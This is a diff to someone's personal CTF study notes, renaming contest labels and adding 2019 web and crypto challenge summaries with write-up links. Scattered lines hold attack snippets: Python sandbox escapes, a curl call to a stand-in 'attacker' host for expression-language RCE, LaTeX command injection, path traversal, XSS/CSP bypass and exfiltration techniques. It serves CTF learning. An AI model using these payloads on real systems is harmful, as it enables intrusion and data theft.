@@ -4,7 +4,7 @@
 * python sandbox/jail escapes
 http://gynvael.coldwind.pl/n/python_sandbox_escape
 print(().__class__.__bases__[0].__subclasses__()[40]('./key').read()) (pybabbies - csaw-ctf-2014)
-{}.__class__.__base__.__subclasses__()[40]("/home/john/flag.txt").read() (exploit300 - volga-quals-2014)
+{}.__class__.__base__.__subclasses__()[40]("/home/john/flag.txt").read() (exploit300 - volga-ctf-quals-2014)
 http://tasteless.eu/post/2014/01/phd-ctf-quals-2014-pyjail/
 http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/
 
@@ -221,7 +221,7 @@ http://blog.dragonsector.pl/2014/03/ructf-2014-quals-tls-crypto-300.html
 TO READ
 https://github.com/ctfs/write-ups-2014/tree/master/secuinside-ctf-prequal-2014/pillow
 
-* crypto100 - volga-quals-2014
+* crypto100 - volga-ctf-quals-2014
 ciphertext is a big number, we have an encryption oracle, each letter is assigned a number and an exponent depending on its position
 they are all multiplied together to produce the ciphertext
 need to factorize the ciphertext to find which letters were used
@@ -492,18 +492,18 @@ exploit linearity of CRC: CRC(a^b^c) = CRC(a) ^ CRC(b) ^ CRC(c).
 exploit polynomial of HMAC
 https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/web/motto-mijkai-address-400
 
-* curious - plaidctf-2015
+* curious - plaid-ctf-2015
 rsa wiener
 https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/crypto/curious
 
-* strength - plaidctf-2015
+* strength - plaid-ctf-2015
 egcd, we have (N, e1, c1) and (N, e2, c2) such that gcd(e1, e2) = 1 then we can do egcd(e1, e2) = a1e1 + a2e2 = 1.
 c1^a1 * c2^a2 = (m^e1)^a1 * (m^e2)^a2 = m^(e1a1) * m^(e2a2) = m^(e1a1 + e2a2) = m^1 = m (all mod N)
 in this case a2 is negative so we have to find the modular multiplicative inverse of the corresponding
 ciphertext c2 and calculate b = (gcd(e1, e2)-(a*e1))/e2 so we can calculate c1^a1 * modinv(c2, N)^(-b) % N = m
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/crypto/strength
 
-* lazy - plaidctf-2015
+* lazy - plaid-ctf-2015
 Merkle-Hallman knapsack cryptosystem
 use lattice and using LLL reduction
 http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html
@@ -517,12 +517,12 @@ huge RSA private key (d has over four million bits)
 we can determine the factors of n given a pair (e, d) using Dan Boneh’s paper (http://www.ams.org/notices/199902/boneh.pdf)
 https://hxp.io/blog/20/TUMCTF%20Teaser%202015:%20crypto150%20%22really_slow_arithmetic%22%20writeup/
 
-* cpkc - volgactf-quals-2015
+* cpkc - volga-ctf-quals-2015
 LLL-based attack on NTRUEncrypt-like cryptosystem
 we need to find small values, so we solve this using LLL algorithm
 http://mslc.ctf.su/wp/volgactf-quals-2015-cpkc-crypto-400-writeup/
 
-* lcg - volgactf-quals-2015
+* lcg - volga-ctf-quals-2015
 recover 3 successive outputs to clone the LCG PRNG
 LCGs aren't cryptographically secure PRNGs as the internal states and the initial state can be easily recovered from a series of 3 successive outputs
 we can see encrypt is a stream cipher that xors the plaintext with the
@@ -532,7 +532,7 @@ defined as state[i+1] = (a*state[i] + b) mod m indicate that the PRNG is a
 linear congruential generator.
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/VOLGACTF/crypto/lcg/README.md
 
-* rsa - volgactf-quals-2015
+* rsa - volga-ctf-quals-2015
 rsa wiener (huge public exponent may mean small private exponent)
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/crypto/rsa
 
@@ -669,7 +669,7 @@ chunks too small to be decrypted with openssl rsautl, so wrote decrypt-rsa.py
 breaking Goldreich-Goldwasser-Halevi lattice encryption
 http://hxp.io/blog/26/
 
-* rabit - plaidctf-2016
+* rabit - plaid-ctf-2016
 parity oracle - exploit least significant bit oracle using binary-search
 in malleable cryptosystems (like RSA or Rabin), the property exists:
 c = m^e % N
@@ -679,15 +679,15 @@ so we can arbitrarily multiply the plaintext, with Rabin if we multiply cipherte
 we send 4*CT (sqrt_mod(4*CT, N) = sqrt_mod(4, N)*sqrt_mod(CT, N) = 2*PT mod N), if lsb == 0 then 2*PT < N otherwise 2*PT > N
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit
 
-* sexec - plaidctf-2016
+* sexec - plaid-ctf-2016
 attacking a small instance of Ring-LWE based cryptosystem with Babai’s Nearest Vector algorithm
 http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/
 
-* radioactive - plaidctf-2016
+* radioactive - plaid-ctf-2016
 fault attack on RSA signature (not RSA-CRT)
 http://mslc.ctf.su/wp/plaidctf-2016-radioactive-crypto-275/
 
-* tonnerre - plaidctf-2016
+* tonnerre - plaid-ctf-2016
 break SRP via session secret fixation (g^2)
 https://github.com/ctfs/write-ups-2016/tree/master/plaidctf-2016/crypto/tonnerre-300
 
@@ -1010,6 +1010,11 @@ https://ctftime.org/writeup/9412
 plaintext compressed before being encrypted -> CRIME/BREACH type attack
 https://ctftime.org/writeup/12913
 
+* real-baby-rsa - tokyo-western-ctf-2019
+flag is encrypted character by character without any random padding
+create lookup table by encrypting all printable characters to decrypt flag
+https://github.com/p4-team/ctf/tree/master/2019-09-02-tokyowesterns/baby_rsa
+
 * easyrsa - de1ctf-2020
 howgrave-graham and seifert's attack
 2 rsa keys with same modulus, public & private exponents are big but not vuln to wiener or boneh-durfee attacks
@@ -1124,14 +1129,14 @@ http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-strange/
 convert qr code rendered as terminal lines into an image and use qrcode python import to scan it
 http://capturetheswag.blogspot.com.au/2015/04/backdoor-ctf-2015-qr-challenge-response.html
 
-* poem - volgactf-quals-2015
+* poem - volga-ctf-quals-2015
 varying spaces between each line
 decompress PDF streams using qpdf --qdf --object-streams=disable poem.pdf out.pdf
 we focus on the text-positioning operators that move a text line
 a Td text line operator has two operands, the flag was encoded in second operand of each Td (14 is 0 and 17 is 1)
 https://github.com/ctfs/write-ups-2015/tree/master/volgactf-quals-2015/stego/poem
 
-* strange text - volgactf-quals-2015
+* strange text - volga-ctf-quals-2015
 strange text file containing some float numbers
 0.09.491787910461426,0.3002592921257019,
 0.09.47504711151123,0.30399078130722046,
@@ -1140,7 +1145,7 @@ strange text file containing some float numbers
 we can plot each of these points using matplotlib
 https://github.com/ctfs/write-ups-2015/tree/master/volgactf-quals-2015/stego/strange-text
 
-* midi - volgactf-quals-2015
+* midi - volga-ctf-quals-2015
 parse midi file
 https://www.whitehatters.academy/volgactf-2015-midi/
 
@@ -1277,7 +1282,7 @@ https://github.com/pwning/public-writeup/blob/master/hitcon2015/forensic250-puzz
 recovery by hand
 https://github.com/pwning/public-writeup/blob/master/mma2015/misc400-qr/writeup.md
 
-* png-uncorrupt - plaidctf-2015
+* png-uncorrupt - plaid-ctf-2015
 png chunks with incorrect CRC because some \x0d\x0a were converted to \x0a
 if length is correct and CRC is incorrect, only fix CRC
 if length is incorrect, prepends \x0d in front of every \x0a and CRC should now match
@@ -1288,7 +1293,7 @@ spectrogram using sox blah.flac -n spectrogram
 converting audio to note sheet
 https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/forensics/its-hungry
 
-* russian doll - volgactf-quals-2015
+* russian doll - volga-ctf-quals-2015
 bitlocker encrypted volume
 use Diskinternals EFS recovery to mount given iso as raw disk image
 volume name which contains the password
@@ -1497,7 +1502,7 @@ use xss in website1 to redirect victim to our page with a csrf that POSTs to web
 use xhr to add a form that will exfil internal website3 pages
 https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies.html
 
-* web300 - volga-quals-2014
+* web300 - volga-ctf-quals-2014
 EncChar crazy php trick
 http://dvteam.org/writeups/volgactf/quals/2014/web/300/
 HINT: /?e=echo pi
@@ -1528,7 +1533,7 @@ $f = str_replace(array('`','$','*','#',':','\\','"','(',')','>','\'','/','^',';'
 die(@eval("$f();"));
 FLAG?: ...
 
-* web400 - volga-quals-2014
+* web400 - volga-ctf-quals-2014
 rce via expression language injection
 curl .../?header=http://attacker/pwn.xtml
 cat pwn.xhtml
@@ -1540,7 +1545,7 @@ cat pwn.xhtml
 </body>
 </html>
 
-* web500 - volga-quals-2014
+* web500 - volga-ctf-quals-2014
 /login?login=log&password=pass => true (https://sqlite.org/lang_keywords.html)
 https://rdot.org/forum/showthread.php?p=35191#post35191
 
@@ -2054,6 +2059,11 @@ https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/
 upload cv in yaml format, rce via LaTex injection -> skype: BBBBBBBBBBBBBB}\skype{\input|"ls *"}%
 https://tipi-hack.github.io/2018/04/01/quals-NDH-18-linked-out.html
 
+* filemanager - 35c3ctf
+xs search via xss auditor
+https://gist.github.com/l4wio/3a6e9a7aea5acd7a215cdc8a8558d176
+https://www.youtube.com/watch?v=HcrQy0C-hEA
+
 * l33t hoster - insomnihack-teaser-2019
 upload .htaccess/.wbmp polyglot, \x00 same as a comment line in .htaccess files
 then bypass disable_functions via putenv() LD_PRELOAD and mail() and code a solver to solve captcha
@@ -2066,6 +2076,28 @@ https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t
 * phuck2 - insomnihack-teaser-2019
 php lfi because file_get_contents('data:,blah/payload') -> 'blah/payload' and include('data:,blah/payload'); -> include('blah/payload')
 https://ctftime.org/writeup/12921
+
+* bypasses everywhere - inshack-ctf-2019
+bypass xss auditor by splitting payload into 2 query params
+bypass script-src CSP with JSONP
+post a json payload with <form method=post enctype=text/plain
+https://github.com/InsecurityAsso/inshack-2019/blob/master/bypasses-everywhere/writeup.md
+or use 2 iframes to overwrite /admin with xss (no CSP on /admin)
+https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere
+or use data:text/html,base64,.. URI
+https://ctftime.org/writeup/15227 https://jbz.team/inshack2019/Bypasses_Everywhere
+
+* potent quotables - plaid-ctf-2019
+HTTP/0.9 + cache + alphanumeric deflate = xss
+https://blog.pspaul.de/posts/plaidctf-2019-potent-quotables/
+
+* wallbreaker - 0ctf-quals-2019
+open_basedir bypasses with glob, fastcgi client or LD_PRELOAD
+https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy
+
+* shop - volga-ctf-quals-2019
+spring mvc mass assignment
+https://balsn.tw/ctf_writeup/20190329-volgactfqual/#shop
 
 * rich project - codegate-preliminary-2019
 zip password encrypted with weak ZipCrypto algorithm rather than AES, crack using pkcrack or bkcrack
@@ -2083,6 +2115,56 @@ https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#blog20solves
 * mime checkr - nullcon-hackim-ctf-2019
 phar/jpeg polyglot with ssrf
 https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#mimecheckr4solves
+
+* hotel booking system - 0ctf-2019
+apache tapestry 5 allows access to .class files, rce via deserialization
+https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system
+
+* ooops - defcon-ctf-quals-2019
+xss reflected in error page, sqlite sqli to retrieve flag, dns rebinding alt solution
+https://balsn.tw/ctf_writeup/20190513-defconctfqual/#ooops
+
+* gogo powersql - hitcon-ctf-quals-2019
+goahead + cgi + libmysqlclient (goahead not vuln to CVE-2017-17562)
+make client connect to our mysql server to read /flag https://github.com/lcark/MysqlClientAttack
+or rce via the LIBMYSQL_PLUGINS= and LIBMYSQL_PLUGIN_DIR= env vars, with a 512-byte dir to truncate .so automatically appended by mysql
+then overwrite math.random() function in lua redis
+https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#gogo-powersql
+
+* buggy .net - hitcon-ctf-quals-2019
+using .NET request validation to trigger the exception and bypass waf
+solve with curl -X GET -d 'filename=..\..\FLAG.txt&o=<x'
+https://ctftime.org/writeup/16802 https://github.com/orangetw/My-CTF-Web-Challenges#buggy-net
+
+* bounty pl3ez - hitcon-ctf-quals-2019
+xss with %E2%80%A8--> to comment line after unicode newline
+https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#bounty-pl33z
+
+* babycsp - csaw-ctf-2019
+xss bypass CSP using Google jsonp endpoint
+https://github.com/jacopotediosi/Writeups/tree/master/CTF/2019/CSAW-Quals-2019/Web-BabyCSP-50
+
+* unagi - csaw-ctf-2019
+xxe bypass waf with iconv -f UTF-8 -t UTF-16BE
+https://ctftime.org/writeup/16461
+
+* buyify - csaw-ctf-2019
+ssti in handlebars with prototype pollution to override the getter of the jwt signing key
+key becomes '[object Object]' and we can forge jwt
+https://github.com/terjanq/Flag-Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify
+https://github.com/perfectblue/ctf-writeups/blob/master/2019/csaw-ctf-2019-quals/Buyifi-500/solve.js
+
+* php note - tokyo-western-ctf-2019
+leak hmac key using windows defender as a side channel
+https://saarsec.rocks/2019/09/04/twctf-phpnote.html
+
+* paste-tastic - google-ctf-2019
+xss with no origin check in parent's postMessage handling code
+trigger xss auditor to remove CONFIG
+dom clobbering to redefine CONFIG
+top and inner iframes can communicate even middle iframe is different origin
+https://github.com/koczkatamas/gctf19/tree/master/pastetastic
+https://www.youtube.com/watch?v=2up8J9dErHI
 
 * defiltrate - insomnihack-teaser-2020
 java deserialisation with ysoserial and Runtime.exec trick to use redirections
@@ -2139,7 +2221,7 @@ var data=''||{"valueOf":new "".constructor.constructor('return 2')}+1//'
 then some js to make admin upload flag.png as an avatar
 https://www.chainnews.com/articles/390680624719.htm
 
-* pooot - defcon-quals-2020
+* pooot - defcon-ctf-quals-2020
 register a service worker to exfil other requests issued by browser
 https://medium.com/@flohantk/pooot-writeup-217384a6b69c
 
@@ -2150,11 +2232,11 @@ https://medium.com/@flohantk/pooot-writeup-217384a6b69c
 disable timeout in select with setarch -T
 http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/
 
-* reverve100 - volga-quals-2014
+* reverve100 - volga-ctf-quals-2014
 maze solved with btree algo
 http://singularityctf.blogspot.com.au/2014/03/volgactf-quals-2014-writeup-reverse-100.html
 
-* exploit100 - volga-quals-2014
+* exploit100 - volga-ctf-quals-2014
 password value enumeration
 
 * big momma - nuit-du-hack-ctf-qualifications 2014
@@ -2292,7 +2374,7 @@ https://www.id0.one/blog/content/3.bp.html
 
 # }}}
 
-# done (but skipped pwn & reverse tasks) {{{
+# done {{{
 * pico-ctf-2013
 * boston-key-party-2014
 * codegate-preliminary-2014
@@ -2350,7 +2432,7 @@ https://www.id0.one/blog/content/3.bp.html
 * nuit-du-hack-ctf-quals-2015
 * nullcom-hackim-2015
 * opentoall-ctf-2015
-* plaidctf-2015
+* plaid-ctf-2015
 * polictf-2015
 * pragyan-ctf-2015
 * rctf-quals-2015 no writeups
@@ -2364,7 +2446,7 @@ https://www.id0.one/blog/content/3.bp.html
 * th3jackers-ctf-2015/
 * thailand-ctf-2015 no writeups
 * trend-micro-ctf-2015
-* volgactf-quals-2015
+* volga-ctf-quals-2015
 * 0ctf-2016
 * alictf-2016
 * angstromctf-2016
@@ -2399,7 +2481,7 @@ https://www.id0.one/blog/content/3.bp.html
 * nullcon-hackim-2016
 * open-ctf-2016
 * pentest-cyprus-2
-* plaidctf-2016
+* plaid-ctf-2016
 * pwn2win-ctf-2016
 * sctf-2016-q1
 * seccon-ctf-quals-2016
@@ -2450,6 +2532,8 @@ https://www.id0.one/blog/content/3.bp.html
 * seccon-ctf-2017
 * 3dsctf-2017
 * 34c3ctf-2017
+
+
 # }}}
 
 # to do {{{
